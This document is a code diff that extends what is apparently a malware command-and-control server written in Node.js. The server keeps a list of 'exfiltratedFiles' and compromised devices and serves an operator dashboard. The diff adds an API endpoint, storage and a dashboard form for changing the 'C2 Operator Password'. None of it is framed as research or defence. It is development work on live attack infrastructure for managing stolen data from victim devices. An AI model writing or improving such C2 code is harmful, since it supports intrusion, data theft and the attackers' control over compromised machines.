@@ -43,6 +43,9 @@ function loadData() {
             if (json.uploads && Array.isArray(json.uploads)) {
                 exfiltratedFiles.push(...json.uploads);
             }
+            if (json.config && json.config.password) {
+                currentC2Password = json.config.password;
+            }
         }
     } catch (e) {}
 }
@@ -51,7 +54,8 @@ function saveData() {
     try {
         const data = {
             devices: Array.from(devices.values()),
-            uploads: exfiltratedFiles.slice(0, 200)
+            uploads: exfiltratedFiles.slice(0, 200),
+            config: { password: currentC2Password }
         };
         fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
     } catch (e) {}
@@ -417,6 +421,22 @@ app.post('/api/rename-device', (req, res) => {
     }
 });
 
+// Change C2 Password API Endpoint
+app.post('/api/change-password', (req, res) => {
+    try {
+        const { password } = req.body || {};
+        if (password && typeof password === 'string' && password.trim().length > 0) {
+            currentC2Password = password.trim();
+            saveData();
+            console.log('[SECURITY UPDATE] C2 Operator Password updated successfully.');
+            return res.json({ success: true });
+        }
+        res.status(400).json({ success: false, error: 'Invalid password' });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
 // GET / serves Operator Dashboard HTML or handles GET check-ins
 app.get('/', (req, res) => {
     if (req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
@@ -582,6 +602,15 @@ app.get('/', (req, res) => {
             </div>
         </div>
 
+        <!-- SECURITY SETTINGS CARD -->
+        <div class="card" style="margin-top: 25px; border-left: 3px solid var(--neon-orange);">
+            <h2 style="text-align: center; color: var(--neon-orange); margin-bottom: 20px;">SECURITY_SETTINGS</h2>
+            <div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; align-items: center;">
+                <input id="new-c2-pass" type="password" placeholder="NEW OPERATOR PASSCODE" style="background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 8px 12px; border-radius: 6px; outline: none; font-family: monospace; width: 280px; font-size: 0.75rem;">
+                <button onclick="changeC2Password()" class="btn btn-small" style="border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255,157,0,0.05); margin: 0; font-weight: bold;">UPDATE_PASSCODE</button>
+            </div>
+        </div>
+
         <!-- FOOTER CARD -->
         <div class="card" style="text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;">
             &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; "The one's who MIND don't matter... The one's who MATTER don't mind..." &nbsp;//&nbsp; Push the Limits
@@ -608,6 +637,30 @@ app.get('/', (req, res) => {
         o.style.bottom = "15%";
         setTimeout(() => o.style.display = "none", 300);
       }, 3800);
+    }
+
+    function changeC2Password() {
+        const passInput = document.getElementById('new-c2-pass');
+        const newPass = passInput ? passInput.value.trim() : '';
+        if (!newPass) {
+            showToast("PASSCODE_CANNOT_BE_EMPTY", "error");
+            return;
+        }
+        fetch('/api/change-password', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password: newPass })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                showToast("C2_PASSWORD_UPDATED_SUCCESSFULLY");
+                if (passInput) passInput.value = '';
+            } else {
+                showToast('Failed to update password: ' + (data.error || 'Unknown error'), "error");
+            }
+        })
+        .catch(err => showToast('Network error updating password.', "error"));
     }
 
     function renameDevice(deviceId, currentAlias) {
